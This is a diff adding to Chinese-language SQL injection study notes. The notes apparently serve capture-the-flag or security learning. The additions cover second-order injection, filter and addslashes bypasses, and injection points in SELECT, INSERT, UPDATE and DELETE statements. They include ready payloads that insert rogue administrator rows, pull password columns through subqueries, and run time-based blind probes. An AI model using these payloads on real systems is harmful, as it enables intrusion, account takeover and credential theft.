@@ -206,7 +206,27 @@ sqlmap盲注默认采用的是二分查找法
 ```
 
 ```
-show columns from `table;–+
+show columns from `table;--+
+```
+
+# 二次注入
+
+有的时候在写入的时候，恶意字符被转义，正常进入数据库保存
+
+```sql
+INSERT INTO wp_users VALUES(2,'admin\'or\'1')
+```
+
+数据库保存的内容为
+
+```
+admin 'or' 1
+```
+
+当用需要SELECT这条语句的地方就会触发
+
+```sql
+SELECT * FROM wp_users WHERE username='admin'or'1';
 ```
 
 
@@ -222,7 +242,7 @@ show columns from `table;–+
 3. ${IFS替换
 4. %20替换
 5. <和<>重定向符替换
-6. %09替换
+6. %09,%0a,%0b,%0c,%0d,%a0替换
 
 ## 将关键词替换为空
 
@@ -246,5 +266,159 @@ or ---  %25%36%66%25%37%32
 set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;#
 ```
 
+或者
+
+```
+/*!50000select*/
+```
+
+## 过滤引号
+
+可以用`\`使引号逃逸
+
+如果有
+
+```php
+$sql = "SELECT * FROM wp_news WHERE id = 'a' AND title = 'haha'"
+```
+
+可以构造
+
+```php
+$sql = "SELECT * FROM wp_news WHERE id = 'a\' AND title = 'OR sleep(1)'"
+```
+
+后面的title处的语句就可以逃逸，成功执行
+
+## addslashes
+
+这个函数开启会转义特殊字符
+
+可以通过编码绕过，比如base64,urldecode进行转移，这个时候参数处于编码状态，无法被转义
+
+# 一些可控点
+
+- 上传文件的文件名
+- http header
+
+# 注入点
+
+## SELECT
+
+```SQL
+SELECT select_expr FROM table_references 
+```
+
+### 注入点在select_expr
+
+```sql
+SELECT $_GET['id'],content FROM wp_news
+```
+
+可以调用
+
+```
+test.php?id=(select pwd from users) as title
+```
+
+或者盲注
+
+### 注入点在table_reference
+
+```sql
+SELECT title,content FROM $_GET['table']
+```
+
+我们可以使用
+
+```sql
+SELECT title,content FROM (SELECT pwd as title FROM wp_user)
+```
+
+### 注入点在WHERE或者HAVING后
+
+```sql
+SELECT title FROM wp_news WHERE id=$_GET['id']
+```
+
+基本注入方法
+
+### 注入点在GROUP BY 或ORDER BY 后
+
+```sql
+SELECT title FROM wp_news GROUP BY $_GET['title']
+```
+
+经过测试
+
+```
+title=id desc,(if(1,sleep(1),1))
+```
+
+会延迟一秒，可以延迟注入
+
+### 注入点在LIMIT后
+
+使用UNION注入，PROCEDURE注入(Mysql<5.6)或者基于时间的注入
+
+## INSERT
+
+```SQL
+INSERT INTO tbl_name VALUES()
+```
+
+### 注入点位于tbl_name
+
+```sql
+INSERT INTO $_GET['table'] VALUES (2,2,2,2)
+```
+
+可以直接控制表名插入新管理员
+
+```
+?table=wp_user values(2,'newadmin','newadmin') %23
+```
+
+### 注入点位于VALUES
+
+```sql
+INSERT INTO wp_user VALUES (2,2,'username','1')
+```
+
+如果后面对应的是管理员标识，闭合单引号和括号，即可多添加一条语句
+
+```
+?is_admin=1'),(2,2,'admin','0') %23
+```
 
 
+
+即可插入一个新的管理员
+
+```sql
+INSERT INTO wp_user VALUES (2,2,'username','1'),(2,2,'admin','0')
+```
+
+或者在新闻添加等位置插入查询语句
+
+```
+INSERT INTO wp_user VALUES (2,2,'username','SELECT pwd FROM wp_user LIMIT 1')
+```
+
+然后在对应输出的地方就可以看到查询的pwd
+
+## UPDATE
+
+```sql
+UPDATE wp_user SET id=2 WHERE user = '23'
+```
+
+如果id可控，即可修改多个字段内容，甚至user也是可控的
+
+## DELETE
+
+```sql
+DELETE FROM wp_news WHERE id=$_GET['ID']
+```
+
+为了保证不影响正常数据，通常使用'AND SLEEP(1)保证为FALSE,后续就是时间盲注
